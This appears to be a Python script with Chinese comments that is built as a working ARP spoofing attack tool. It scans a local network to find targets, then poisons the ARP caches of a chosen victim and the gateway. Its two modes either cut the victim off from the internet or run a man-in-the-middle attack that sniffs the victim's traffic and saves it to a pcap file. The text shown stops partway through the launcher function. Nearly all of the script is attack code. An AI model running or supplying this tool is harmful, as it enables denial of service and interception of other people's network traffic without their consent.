#  没有报错的 APR攻击

from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap, ICMP, IP)
from scapy.layers.inet import TCP, UDP
import os
import sys
import time
import platform
import subprocess
import re
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import ipaddress
import locale
import signal

def setup_encoding():
    """设置全局编码以避免子进程编码错误"""
    # 方法1: 设置环境变量
    os.environ['PYTHONIOENCODING'] = 'utf-8'
    
    # 方法2: 设置标准流编码
    if hasattr(sys.stdout, 'reconfigure'):
        try:
            sys.stdout.reconfigure(encoding='utf-8')
        except:
            pass
    if hasattr(sys.stderr, 'reconfigure'):
        try:
            sys.stderr.reconfigure(encoding='utf-8')
        except:
            pass
    
    # 方法3: 针对Windows的特定设置
    if platform.system() == "Windows":
        # 设置控制台代码页为UTF-8
        try:
            os.system('chcp 65001 > nul 2>&1')
        except:
            pass

def setup_signal_handlers():
    """设置信号处理器"""
    def signal_handler(sig, frame):
        print(f"\n🛑 接收到信号 {sig}，正在安全退出...")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

def safe_subprocess_run(cmd, shell=True):
    """安全的子进程执行函数 - 增强编码处理"""
    try:
        # 优先使用UTF-8编码
        result = subprocess.run(cmd, shell=shell, 
                              capture_output=True, text=True,
                              encoding='utf-8', errors='ignore')
        return result
    except UnicodeDecodeError:
        # 如果UTF-8失败，尝试系统默认编码
        try:
            encoding = locale.getpreferredencoding()
            result = subprocess.run(cmd, shell=shell, 
                                  capture_output=True, text=True,
                                  encoding=encoding, errors='ignore')
            return result
        except Exception as e:
            print(f"子进程执行错误: {e}")
            return None
    except Exception as e:
        print(f"子进程执行错误: {e}")
        return None

def is_admin():
    """检查是否具有管理员权限"""
    try:
        if platform.system() == "Windows":
            from ctypes import windll
            return windll.shell32.IsUserAnAdmin()
        else:
            return os.getuid() == 0
    except:
        return False

def get_mac(ip, interface=None):
    """获取IP地址的MAC地址 - 修复版本"""
    try:
        # 构造ARP请求包
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        
        # 发送请求
        if interface:
            answered_list = srp(arp_request_broadcast, timeout=3, 
                              iface=interface, verbose=False)[0]
        else:
            answered_list = srp(arp_request_broadcast, timeout=3, 
                              verbose=False)[0]
        
        # 处理响应
        if answered_list:
            for sent, received in answered_list:
                return received.hwsrc
        else:
            print(f"⚠️  无法获取 {ip} 的MAC地址，设备可能不在线或防火墙阻止")
            return None
            
    except Exception as e:
        print(f"❌ 获取 {ip} 的MAC地址时出错: {e}")
        return None

def enable_ip_forwarding(enable):
    """启用或禁用IP转发 - 静默执行避免编码错误"""
    try:
        if platform.system() == "Linux":
            value = "1" if enable else "0"
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write(value)
        elif platform.system() == "Windows":
            # 静默执行，不捕获输出避免编码问题
            if enable:
                cmd = "netsh interface ipv4 set interface %s forwarding=enabled" % (conf.iface if hasattr(conf, 'iface') else "Local Area Connection")
            else:
                cmd = "netsh interface ipv4 set interface %s forwarding=disabled" % (conf.iface if hasattr(conf, 'iface') else "Local Area Connection")
            
            # 使用静默模式执行
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        # 静默处理错误，不影响主要功能
        pass

def check_windows_ip_forwarding():
    """检查Windows IP转发状态"""
    try:
        result = subprocess.run("netsh interface ipv4 show global", shell=True, 
                               capture_output=True, text=True, encoding='utf-8', errors='ignore')
        return "forwarding enabled" in result.stdout.lower()
    except:
        return False

def get_default_gateway_windows():
    """获取Windows默认网关 - 修复编码版本"""
    try:
        # 使用UTF-8编码
        result = subprocess.run("route print 0.0.0.0", shell=True,
                              capture_output=True, text=True,
                              encoding='utf-8', errors='ignore')
        
        lines = result.stdout.split('\n')
        for i, line in enumerate(lines):
            if "0.0.0.0" in line and "0.0.0.0" in line:
                # 下一行通常是网关信息
                if i + 1 < len(lines):
                    next_line = lines[i + 1]
                    parts = next_line.split()
                    if len(parts) >= 3:
                        gateway = parts[2]
                        if gateway and len(gateway.split('.')) == 4:
                            print(f"🔍 通过route命令发现网关: {gateway}")
                            return gateway
        
        # 方法2: 使用ipconfig作为备选
        result = subprocess.run("ipconfig", shell=True, capture_output=True, 
                               text=True, encoding='utf-8', errors='ignore')
        lines = result.stdout.split('\n')
        for line in lines:
            if "默认网关" in line or "Default Gateway" in line.lower():
                parts = line.split(':')
                if len(parts) > 1:
                    gateway = parts[1].strip()
                    # 清理网关地址
                    gateway = re.sub(r'[^0-9.]', '', gateway)
                    if gateway and len(gateway.split('.')) == 4:
                        print(f"🔍 通过ipconfig发现网关: {gateway}")
                        return gateway
        
        # 方法3: 使用netsh命令
        result = subprocess.run("netsh interface ip show config", shell=True, 
                               capture_output=True, text=True, encoding='utf-8', errors='ignore')
        lines = result.stdout.split('\n')
        for line in lines:
            if "默认网关" in line or "Default Gateway" in line.lower():
                parts = line.split(':')
                if len(parts) > 1:
                    gateway = parts[1].strip()
                    gateway = re.sub(r'[^0-9.]', '', gateway)
                    if gateway and len(gateway.split('.')) == 4:
                        print(f"🔍 通过netsh发现网关: {gateway}")
                        return gateway
        
        print("❌ 无法自动检测网关")
        return None
        
    except Exception as e:
        print(f"获取网关时出错: {e}")
        return None

def get_default_gateway_linux():
    """获取Linux默认网关"""
    try:
        # 方法1: 使用ip route命令
        result = subprocess.run("ip route | grep default", shell=True, 
                               capture_output=True, text=True, encoding='utf-8', errors='ignore')
        if result.returncode == 0:
            match = re.search(r'default via (\d+\.\d+\.\d+\.\d+)', result.stdout)
            if match:
                gateway = match.group(1)
                print(f"🔍 通过ip route发现网关: {gateway}")
                return gateway
        
        # 方法2: 使用netstat命令
        result = subprocess.run("netstat -rn | grep '^0.0.0.0'", shell=True, 
                               capture_output=True, text=True, encoding='utf-8', errors='ignore')
        if result.returncode == 0:
            parts = result.stdout.split()
            if len(parts) >= 2:
                gateway = parts[1]
                if gateway and len(gateway.split('.')) == 4:
                    print(f"🔍 通过netstat发现网关: {gateway}")
                    return gateway
        
        print("❌ 无法自动检测网关")
        return None
        
    except Exception as e:
        print(f"获取网关时出错: {e}")
        return None

def get_default_gateway():
    """获取默认网关 - 跨平台版本"""
    if platform.system() == "Windows":
        return get_default_gateway_windows()
    else:
        return get_default_gateway_linux()

def test_windows_compatibility():
    """测试Windows环境兼容性"""
    print("检查Windows环境兼容性...")
    
    # 检查管理员权限
    if not is_admin():
        print("❌ 请以管理员身份运行此程序")
        return False
    
    # 检查Scapy导入
    try:
        from scapy.all import conf
        print("✅ Scapy导入正常")
    except ImportError as e:
        print(f"❌ Scapy未正确安装: {e}")
        print("请运行: pip install scapy")
        return False
    
    # 检查网络驱动
    try:
        if platform.system() == "Windows":
            from scapy.arch.windows import get_windows_if_list
            ifaces = get_windows_if_list()
            if ifaces:
                print("✅ 网络驱动正常")
                print(f"检测到 {len(ifaces)} 个网络接口")
            else:
                print("❌ 未找到网络接口")
                return False
    except Exception as e:
        print(f"❌ 网络驱动问题: {e}")
        print("请安装Npcap: https://nmap.org/npcap/")
        return False
    
    return True

def get_windows_interfaces():
    """获取Windows网络接口详细信息"""
    print("检测Windows网络接口...")
    interfaces = []
    try:
        from scapy.arch.windows import get_windows_if_list
        raw_interfaces = get_windows_if_list()
        
        for iface in raw_interfaces:
            interface_info = {
                'name': iface['name'],
                'description': iface.get('description', 'N/A'),
                'guid': iface.get('guid', 'N/A'),
                'mac': iface.get('mac', '00:00:00:00:00:00'),
                'ips': iface.get('ips', [])
            }
            interfaces.append(interface_info)
            
        # 显示接口信息
        for i, iface in enumerate(interfaces):
            print(f"  {i+1}. {iface['name']}")
            print(f"     描述: {iface['description']}")
            print(f"     MAC: {iface['mac']}")
            if iface['ips']:
                print(f"     IP地址: {', '.join(iface['ips'][:2])}")
            print()
            
    except Exception as e:
        print(f"获取接口列表失败: {e}")
        
    return interfaces

def select_windows_interface():
    """让用户选择Windows网络接口"""
    interfaces = get_windows_interfaces()
    if not interfaces:
        print("❌ 未找到可用的网络接口")
        return None
        
    print("\n请选择网络接口:")
    for i, iface in enumerate(interfaces):
        print(f"{i+1}. {iface['name']} - {iface['description']}")
    
    try:
        choice = int(input("输入序号 (默认1): ") or 1) - 1
        if 0 <= choice < len(interfaces):
            selected = interfaces[choice]['name']
            print(f"✅ 已选择接口: {selected}")
            return selected
        else:
            print("❌ 无效选择，使用默认接口")
            return interfaces[0]['name']
    except (ValueError, KeyboardInterrupt):
        print("❌ 输入错误，使用默认接口")
        return interfaces[0]['name'] if interfaces else None

def get_local_ip(interface=None):
    """获取本机IP地址"""
    try:
        if interface:
            # 获取指定接口的IP
            from scapy.arch.windows import get_windows_if_list
            ifaces = get_windows_if_list()
            for iface in ifaces:
                if iface['name'] == interface and iface.get('ips'):
                    return iface['ips'][0]  # 返回第一个IP
        else:
            # 获取默认接口IP
            return conf.iface.ip
    except:
        pass
    return None

def get_network_info(interface=None):
    """获取完整的网络信息"""
    local_ip = get_local_ip(interface)
    gateway = get_default_gateway()
    
    print(f"📊 网络信息:")
    print(f"   本机IP: {local_ip}")
    print(f"   网关: {gateway}")
    
    if local_ip and gateway:
        # 计算网络范围
        try:
            network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
            print(f"   网络范围: {network}")
            print(f"   可用IP数量: {len(list(network.hosts()))}")
        except:
            pass
    
    return local_ip, gateway

def get_network_range(ip, netmask="24"):
    """根据IP和子网掩码获取网段范围"""
    try:
        if '/' not in ip:
            ip = f"{ip}/{netmask}"
        
        network = ipaddress.ip_network(ip, strict=False)
        return [str(ip) for ip in network.hosts()]
    except Exception as e:
        print(f"计算网段范围时出错: {e}")
        return []

def arp_scan(target_ip, interface=None, timeout=3):
    """使用ARP扫描单个IP - 增强错误处理"""
    try:
        # 添加全局锁避免资源竞争
        with threading.Lock():
            arp_request = ARP(pdst=target_ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            if interface:
                answered, unanswered = srp(arp_request_broadcast, timeout=timeout, 
                                         iface=interface, verbose=False, 
                                         retry=1)  # 减少重试
            else:
                answered, unanswered = srp(arp_request_broadcast, timeout=timeout, 
                                         verbose=False, retry=1)
            
            if answered:
                for sent, received in answered:
                    return {
                        'ip': received.psrc,
                        'mac': received.hwsrc,
                        'type': 'ARP'
                    }
    except Exception as e:
        if "Bad file descriptor" not in str(e):
            print(f"ARP扫描错误 {target_ip}: {e}")
        return None
    return None

def icmp_scan(target_ip, interface=None, timeout=2):
    """使用ICMP Ping扫描单个IP"""
    try:
        packet = IP(dst=target_ip)/ICMP()
        
        if interface:
            ans = srp(packet, timeout=timeout, verbose=False, iface=interface)
        else:
            ans = srp(packet, timeout=timeout, verbose=False)
        
        if ans and ans[0]:
            return {
                'ip': target_ip,
                'type': 'ICMP'
            }
    except:
        pass
    return None

def tcp_syn_scan(target_ip, port=80, interface=None, timeout=2):
    """使用TCP SYN扫描单个IP的指定端口"""
    try:
        packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
        
        if interface:
            ans = srp(packet, timeout=timeout, verbose=False, iface=interface)
        else:
            ans = srp(packet, timeout=timeout, verbose=False)
        
        if ans and ans[0]:
            for sent, received in ans[0]:
                if received.haslayer(TCP) and received[TCP].flags & 0x12:  # SYN-ACK
                    return {
                        'ip': target_ip,
                        'port': port,
                        'type': 'TCP'
                    }
    except:
        pass
    return None

def scan_ip(ip, interface=None):
    """扫描单个IP - 需要添加这个缺失的函数"""
    result = None
    
    # 先尝试ARP扫描
    result = arp_scan(ip, interface)
    
    if not result:
        # 再尝试ICMP扫描
        result = icmp_scan(ip, interface)
    
    if not result:
        # 最后尝试TCP端口扫描
        for port in [80, 443, 22, 21, 23, 53, 135, 139, 445, 3389]:
            result = tcp_syn_scan(ip, port, interface)
            if result:
                break
    
    return result

def scan_network(interface=None, netmask="24", scan_type="arp", threads=50):
    """
    扫描局域网设备
    
    Args:
        interface: 网络接口
        netmask: 子网掩码
        scan_type: 扫描类型 (arp, icmp, tcp, all)
        threads: 线程数
    """
    local_ip = get_local_ip(interface)
    if not local_ip:
        print("❌ 无法获取本机IP地址")
        return []
    
    print(f"🔍 开始扫描局域网...")
    print(f"   本机IP: {local_ip}")
    print(f"   子网掩码: /{netmask}")
    print(f"   扫描类型: {scan_type}")
    print(f"   线程数: {threads}")
    print("   正在扫描，请稍候...")
    
    # 获取网段内所有IP
    target_ips = get_network_range(local_ip, netmask)
    if not target_ips:
        print("❌ 无法计算网段范围")
        return []
    
    print(f"   扫描范围: {len(target_ips)} 个IP地址")
    
    discovered_hosts = []
    lock = threading.Lock()
    
    def safe_scan_ip(ip):
        """安全的IP扫描"""
        try:
            result = None
            
            if scan_type in ["arp", "all"]:
                result = arp_scan(ip, interface)
            
            if not result and scan_type in ["icmp", "all"]:
                result = icmp_scan(ip, interface)
            
            if not result and scan_type in ["tcp", "all"]:
                # 尝试常见端口
                for port in [80, 443, 22, 21, 23, 53, 135, 139, 445, 3389]:
                    result = tcp_syn_scan(ip, port, interface)
                    if result:
                        break
            
            if result:
                with lock:
                    discovered_hosts.append(result)
                return result
            return None
        except Exception as e:
            if "Bad file descriptor" not in str(e):
                print(f"扫描 {ip} 时出错: {e}")
            return None
    
    # Windows下减少线程数避免资源竞争
    if platform.system() == "Windows" and threads > 20:
        threads = 20
        print(f"   Windows系统，线程数调整为: {threads}")
    
    # 使用线程池并发扫描
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(safe_scan_ip, ip): ip for ip in target_ips}
        
        completed = 0
        for future in as_completed(futures):
            completed += 1
            if completed % 20 == 0:
                progress = (completed / len(target_ips)) * 100
                sys.stdout.write(f"\r   进度: {completed}/{len(target_ips)} ({progress:.1f}%)")
                sys.stdout.flush()
    
    print(f"\r   扫描完成: 发现 {len(discovered_hosts)} 个设备")
    return discovered_hosts

def display_scan_results(hosts):
    """显示扫描结果"""
    if not hosts:
        print("❌ 未发现任何设备")
        return
    
    print("\n" + "="*60)
    print("📋 发现的设备列表:")
    print("="*60)
    
    # 按IP排序
    hosts.sort(key=lambda x: [int(octet) for octet in x['ip'].split('.')])
    
    for i, host in enumerate(hosts, 1):
        print(f"{i:2d}. IP: {host['ip']:15s}", end="")
        if 'mac' in host:
            print(f" | MAC: {host['mac']}", end="")
        else:
            print(f" | MAC: {'未知':17s}", end="")
        print(f" | 发现方式: {host['type']}")
    
    print("="*60)

def test_ip_connectivity(target_ip, interface=None):
    """测试IP地址连通性"""
    print(f"\n🔍 测试与 {target_ip} 的连通性...")
    
    # 使用多种方法测试
    methods = [
        ("ARP扫描", lambda: arp_scan(target_ip, interface)),
        ("ICMP Ping", lambda: icmp_scan(target_ip, interface)),
        ("TCP端口扫描(80)", lambda: tcp_syn_scan(target_ip, 80, interface)),
        ("TCP端口扫描(443)", lambda: tcp_syn_scan(target_ip, 443, interface)),
        ("TCP端口扫描(22)", lambda: tcp_syn_scan(target_ip, 22, interface))
    ]
    
    found = False
    results = []
    
    for method_name, method_func in methods:
        print(f"  正在尝试 {method_name}...", end="")
        result = method_func()
        if result:
            print(" ✅ 成功")
            results.append(result)
            found = True
            if 'mac' in result:
                print(f"     发现MAC地址: {result['mac']}")
        else:
            print(" ❌ 失败")
    
    if found:
        print(f"✅ 目标 {target_ip} 在线，可以使用")
        # 返回第一个成功结果的MAC地址
        for result in results:
            if 'mac' in result:
                return target_ip, result['mac']
        return target_ip, None
    else:
        print(f"❌ 无法连接到 {target_ip}，设备可能:")
        print("   - 不在线")
        print("   - 开启了防火墙")
        print("   - 不在同一网段")
        return None, None

def scan_and_select_target(interface=None):
    """扫描网络并选择目标"""
    print("\n正在扫描网络设备...")
    hosts = scan_network(interface, "24", "arp", 20)
    
    if not hosts:
        print("❌ 未发现任何设备，请尝试手动输入IP")
        return None, None
    
    display_scan_results(hosts)
    
    try:
        choice = int(input("\n请选择目标设备序号: ")) - 1
        if 0 <= choice < len(hosts):
            selected_ip = hosts[choice]['ip']
            selected_mac = hosts[choice].get('mac', '未知')
            print(f"✅ 已选择目标: {selected_ip} (MAC: {selected_mac})")
            return selected_ip, selected_mac
        else:
            print("❌ 无效选择")
            return None, None
    except (ValueError, KeyboardInterrupt):
        print("❌ 输入错误")
        return None, None

def select_target_ip(interface=None):
    """让用户选择目标IP地址 - 修复版本"""
    print("\n🎯 选择目标IP地址")
    print("="*40)
    print("1. 手动输入IP地址")
    print("2. 扫描网络并选择设备")
    print("3. 测试IP连通性")
    
    try:
        choice = input("请选择方式 (默认1): ").strip() or "1"
        
        if choice == "1":
            # 手动输入IP
            while True:
                target_ip = input("请输入目标IP地址: ").strip()
                if not target_ip:
                    print("❌ 未输入IP地址")
                    continue
                
                # 验证IP格式
                try:
                    ipaddress.ip_address(target_ip)
                    
                    # 测试连通性
                    tested_ip, mac = test_ip_connectivity(target_ip, interface)
                    if tested_ip:
                        return tested_ip, mac
                    else:
                        retry = input("是否重试? (y/N): ").strip().lower()
                        if retry != 'y':
                            return None, None
                except ValueError:
                    print("❌ 无效的IP地址格式")
                    
        elif choice == "2":
            # 扫描网络并选择
            return scan_and_select_target(interface)
            
        elif choice == "3":
            # 测试IP连通性模式
            print("\n🔍 IP连通性测试模式")
            print("输入要测试的IP地址，输入 'q' 退出")
            
            while True:
                ip = input("请输入IP地址: ").strip()
                if ip.lower() == 'q':
                    return None, None
                    
                try:
                    ipaddress.ip_address(ip)
                    tested_ip, mac = test_ip_connectivity(ip, interface)
                    if tested_ip:
                        use = input("是否使用此IP作为目标? (y/N): ").strip().lower()
                        if use == 'y':
                            return tested_ip, mac
                    else:
                        print("设备不可用")
                        
                except ValueError:
                    print("❌ 无效的IP地址格式")
                    
                cont = input("是否继续测试其他IP? (y/N): ").strip().lower()
                if cont != 'y':
                    return None, None
        else:
            print("❌ 无效选择")
            return None, None
            
    except KeyboardInterrupt:
        return None, None

def network_scanner_mode():
    """网络扫描器模式"""
    print("\n🎯 网络扫描器模式")
    print("="*50)
    
    # 选择接口
    if platform.system() == "Windows":
        interface = select_windows_interface()
        if not interface:
            return
    else:
        interface = None
    
    # 显示网络信息
    get_network_info(interface)
    
    # 选择扫描类型
    print("\n请选择扫描类型:")
    print("1. ARP扫描 (推荐 - 可发现设置了防火墙的设备)")
    print("2. ICMP Ping扫描")
    print("3. TCP端口扫描")
    print("4. 全面扫描 (所有方法)")
    
    try:
        choice = input("输入选择 (默认1): ").strip() or "1"
        scan_types = {
            "1": "arp",
            "2": "icmp", 
            "3": "tcp",
            "4": "all"
        }
        scan_type = scan_types.get(choice, "arp")
    except KeyboardInterrupt:
        return
    
    # 选择子网掩码
    print("\n请选择子网范围:")
    print("1. /24 (255.255.255.0) - 常见家用网络")
    print("2. /16 (255.255.0.0) - 大型网络")
    print("3. 自定义")
    
    try:
        choice = input("输入选择 (默认1): ").strip() or "1"
        if choice == "1":
            netmask = "24"
        elif choice == "2":
            netmask = "16"
        elif choice == "3":
            netmask = input("请输入子网掩码 (如 24, 16, 8): ").strip()
        else:
            netmask = "24"
    except KeyboardInterrupt:
        return
    
    # 开始扫描
    start_time = time.time()
    hosts = scan_network(interface, netmask, scan_type)
    scan_time = time.time() - start_time
    
    # 显示结果
    display_scan_results(hosts)
    print(f"⏱️  扫描耗时: {scan_time:.2f} 秒")
    
    # 询问是否保存结果
    try:
        save = input("\n是否保存结果到文件? (y/N): ").strip().lower()
        if save == 'y':
            filename = f"network_scan_{int(time.time())}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("网络扫描结果\n")
                f.write(f"扫描时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"扫描类型: {scan_type}\n")
                f.write(f"发现设备: {len(hosts)} 个\n\n")
                
                for i, host in enumerate(hosts, 1):
                    f.write(f"{i:2d}. IP: {host['ip']:15s}")
                    if 'mac' in host:
                        f.write(f" | MAC: {host['mac']}")
                    else:
                        f.write(f" | MAC: {'未知':17s}")
                    f.write(f" | 发现方式: {host['type']}\n")
            
            print(f"✅ 结果已保存到: {filename}")
    except KeyboardInterrupt:
        pass

class Arper:
    def __init__(self, victim, gateway, interface=None, poison_interval=2, 
                 packet_count=200, block_internet=True, debug=False):
        # Windows兼容性测试
        if platform.system() == "Windows" and not test_windows_compatibility():
            sys.exit(1)
            
        # 检查权限
        if not is_admin():
            print("❌ 错误: 需要管理员权限运行此程序!")
            sys.exit(1)
            
        self.victim = victim
        self.gateway = gateway
        self.interface = interface
        self.poison_interval = poison_interval
        self.packet_count = packet_count
        self.block_internet = block_internet
        self.debug = debug
        self.original_forward_state = None
        
        # Windows特定配置
        if platform.system() == "Windows":
            print("🪟 Windows 系统检测到，进行特定配置...")
            
            # 如果未指定接口，让用户选择
            if not self.interface:
                self.interface = select_windows_interface()
                if not self.interface:
                    print("❌ 未选择网络接口，程序退出")
                    sys.exit(1)
            
            # 如果未指定网关，尝试自动获取
            if not self.gateway:
                self.gateway = get_default_gateway()
                if self.gateway:
                    print(f"🔍 自动检测到默认网关: {self.gateway}")
                else:
                    print("❌ 无法自动检测网关，请手动指定")
                    # 让用户手动输入网关
                    while True:
                        manual_gateway = input("请输入网关IP地址: ").strip()
                        if not manual_gateway:
                            continue
                        try:
                            ipaddress.ip_address(manual_gateway)
                            # 测试网关连通性
                            gateway_mac = get_mac(manual_gateway, self.interface)
                            if gateway_mac:
                                self.gateway = manual_gateway
                                print(f"✅ 网关 {manual_gateway} 可用")
                                break
                            else:
                                print(f"❌ 无法连接到网关 {manual_gateway}")
                                retry = input("是否重试? (y/N): ").strip().lower()
                                if retry != 'y':
                                    sys.exit(1)
                        except ValueError:
                            print("❌ 无效的IP地址格式")
        
        # 配置Scapy
        if interface:
            conf.iface = interface
        conf.verb = 0
        
        # 显示网络信息
        get_network_info(interface)
        
        # 调试信息
        if self.debug:
            print(f"🔍 调试信息:")
            print(f"   目标IP: {victim}")
            print(f"   网关IP: {gateway}") 
            print(f"   接口: {interface}")
            print(f"   开始获取MAC地址...")
        
        # 获取MAC地址
        print("📡 正在获取MAC地址...")
        self.victimmac = get_mac(victim, interface)
        self.gatewaymac = get_mac(gateway, interface)
        
        if self.debug:
            print(f"   目标MAC: {self.victimmac}")
            print(f"   网关MAC: {self.gatewaymac}")
        
        if not self.victimmac:
            print(f"❌ 错误: 无法获取目标 {victim} 的MAC地址")
            print("可能的原因:")
            print("  - 目标设备不在线")
            print("  - 目标设备开启了防火墙")
            print("  - 目标设备不在同一网段")
            print("  - 网络接口选择错误")
            sys.exit(1)
            
        if not self.gatewaymac:
            print(f"❌ 错误: 无法获取网关 {gateway} 的MAC地址")
            print("可能的原因:")
            print("  - 网关地址错误")
            print("  - 网络连接问题")
            print("  - 网络接口选择错误")
            print("  - 网关设备不响应ARP请求")
            sys.exit(1)
        
        print(f'✅ 初始化完成 - 系统: {platform.system()}')
        print(f'📡 接口: {interface}')
        print(f'🌐 网关 ({gateway}) MAC: {self.gatewaymac}')
        print(f'🎯 目标 ({victim}) MAC: {self.victimmac}')
        print(f'🔧 断网模式: {"开启" if block_internet else "关闭"}')
        print('-' * 50)
        
        # 进程引用
        self.poison_thread = None
        self.sniff_thread = None
        self._running = False
        
        # 设置IP转发
        self.setup_ip_forwarding()
    
    def setup_ip_forwarding(self):
        """设置IP转发状态"""
        try:
            if platform.system() == "Linux":
                with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
                    self.original_forward_state = f.read().strip()
                
                if self.block_internet:
                    enable_ip_forwarding(False)
                else:
                    enable_ip_forwarding(True)
                    
            elif platform.system() == "Windows":
                # 记录当前状态
                self.original_forward_state = check_windows_ip_forwarding()
                
                if self.block_internet:
                    enable_ip_forwarding(False)
                else:
                    # 中间人模式需要IP转发
                    if not check_windows_ip_forwarding():
                        print("⚠️  警告: Windows IP转发未启用，中间人模式可能无法正常工作")
                        print("程序将继续运行，但目标可能无法正常上网")
                    enable_ip_forwarding(True)
                    
        except Exception as e:
            print(f"❌ 设置IP转发状态时出错: {e}")
    
    def restore_ip_forwarding(self):
        """恢复原始IP转发状态"""
        try:
            if platform.system() == "Linux" and self.original_forward_state:
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write(self.original_forward_state)
                print(f"✅ Linux IP转发已恢复为: {self.original_forward_state}")
                
            elif platform.system() == "Windows" and self.original_forward_state is not None:
                enable_ip_forwarding(self.original_forward_state)
                print(f"✅ Windows IP转发已恢复")
                
        except Exception as e:
            print(f"❌ 恢复IP转发状态时出错: {e}")
    
    def run(self):
        """启动ARP欺骗和嗅探 - 修复多进程问题"""
        try:
            self._running = True
            
            # Windows下使用线程而不是进程
            if platform.system() == "Windows":
                print("🪟 Windows系统，使用线程模式")
                # 启动毒化线程
                self.poison_thread = threading.Thread(target=self.poison)
                self.poison_thread.daemon = True
                self.poison_thread.start()
                
                # 只有在中间人模式下才启动嗅探线程
                if not self.block_internet:
                    self.sniff_thread = threading.Thread(target=self.sniff)
                    self.sniff_thread.daemon = True
                    self.sniff_thread.start()
            else:
                # Linux使用进程
                self.poison_thread = Process(target=self.poison)
                self.poison_thread.daemon = True
                self.poison_thread.start()
                
                if not self.block_internet:
                    self.sniff_thread = Process(target=self.sniff)
                    self.sniff_thread.daemon = True
                    self.sniff_thread.start()
                    
        except KeyboardInterrupt:
            self.stop()
        except Exception as e:
            print(f"❌ 运行过程中出错: {e}")
            self.stop()

    def poison(self):
        """持续发送ARP欺骗包 - 修复ARP警告"""
        try:
            print("🧪 开始ARP毒化...")
            print(f"  发送给目标: {self.victim} -> 网关是 {self.gateway}")
            print(f"  发送给网关: {self.gateway} -> 目标在 {self.victim}")
            
            if self.block_internet:
                print("🔧 模式: 断网攻击 - 目标将无法上网")
            else:
                print("🔧 模式: 中间人攻击 - 目标可以上网，流量被嗅探")
            print('-' * 40)
            
            packet_count = 0
            while self._running:
                try:
                    # 修复ARP包构造，添加以太网层避免警告
                    # 毒化目标：让目标认为我们是网关
                    poison_victim = Ether(dst=self.victimmac) / ARP(
                        op=2,  # 2表示ARP响应
                        psrc=self.gateway,    # 声称自己是网关
                        pdst=self.victim,     # 目标IP
                        hwsrc=get_if_hwaddr(self.interface) if self.interface else get_if_hwaddr(conf.iface),  # 我们的MAC
                        hwdst=self.victimmac  # 目标MAC
                    )
                    
                    # 毒化网关：让网关认为我们是目标
                    poison_gateway = Ether(dst=self.gatewaymac) / ARP(
                        op=2,  # 2表示ARP响应
                        psrc=self.victim,     # 声称自己是目标
                        pdst=self.gateway,    # 网关IP
                        hwsrc=get_if_hwaddr(self.interface) if self.interface else get_if_hwaddr(conf.iface),  # 我们的MAC
                        hwdst=self.gatewaymac # 网关MAC
                    )
                    
                    send(poison_victim, verbose=False)
                    send(poison_gateway, verbose=False)
                    
                    packet_count += 2
                    if packet_count % 10 == 0:
                        mode_indicator = "🚫[断网]" if self.block_internet else "👁️[嗅探]"
                        sys.stdout.write(f'\r{mode_indicator} 已发送ARP欺骗包: {packet_count}')
                        sys.stdout.flush()
                    
                    time.sleep(self.poison_interval)
                    
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f"\n❌ 发送ARP包时出错: {e}")
                    time.sleep(1)
                    
        except Exception as e:
            print(f"❌ 毒化过程中出错: {e}")

    def sniff(self, count=None):
        """嗅探网络流量（仅在中间人模式下使用）"""
        try:
            if count is None:
                count = self.packet_count
                
            print(f"⏳ 等待5秒让ARP毒化生效...")
            time.sleep(5)
            print(f'👃 开始嗅探 {count} 个数据包...')
            
            bpf_filter = f"ip host {self.victim}"
            
            packets = sniff(count=count, filter=bpf_filter, 
                          iface=self.interface, store=True)
            
            print(f'✅ 成功捕获 {len(packets)} 个数据包')
            
            filename = f'arper_{int(time.time())}.pcap'
            wrpcap(filename, packets)
            print(f'💾 数据包已保存到: {filename}')
            
        except Exception as e:
            print(f"❌ 嗅探过程中出错: {e}")
        finally:
            self.stop()

    def restore(self):
        """恢复ARP表到正常状态 - 修复ARP警告"""
        try:
            print('\n🔄 正在恢复ARP表...')
            
            # 恢复受害者ARP表：告诉目标正确的网关MAC
            restore_victim = Ether(dst=self.victimmac) / ARP(
                op=2,
                psrc=self.gateway,
                hwsrc=self.gatewaymac,  # 正确的网关MAC
                pdst=self.victim,
                hwdst=self.victimmac
            )
            
            # 恢复网关ARP表：告诉网关正确的目标MAC
            restore_gateway = Ether(dst=self.gatewaymac) / ARP(
                op=2,
                psrc=self.victim,
                hwsrc=self.victimmac,   # 正确的目标MAC
                pdst=self.gateway,
                hwdst=self.gatewaymac
            )
            
            # 发送多个恢复包确保生效
            for i in range(5):
                send(restore_victim, verbose=False)
                send(restore_gateway, verbose=False)
                time.sleep(0.5)
            
            print('✅ ARP表已恢复')
            
        except Exception as e:
            print(f"❌ 恢复ARP表时出错: {e}")

    def stop(self):
        """安全停止所有进程 - 增强版本"""
        print("\n🛑 正在停止ARP欺骗...")
        self._running = False
        
        # 改进进程终止逻辑
        if platform.system() == "Windows":
            # Windows使用线程，直接设置标志
            time.sleep(2)  # 给线程时间退出
        else:
            # Linux使用进程
            if self.poison_thread and self.poison_thread.is_alive():
                self.poison_thread.terminate()
                self.poison_thread.join(timeout=3)
                
            if self.sniff_thread and self.sniff_thread.is_alive():
                self.sniff_thread.terminate()
                self.sniff_thread.join(timeout=3)
        
        self.restore()
        self.restore_ip_forwarding()
        print("✅ 程序已安全停止")

def run_arp_spoofer():
    """运行ARP欺骗工具 - 修复版本"""
    print("\n🦠 ARP欺骗工具")
    print("="*50)
    
    # 启用调试模式
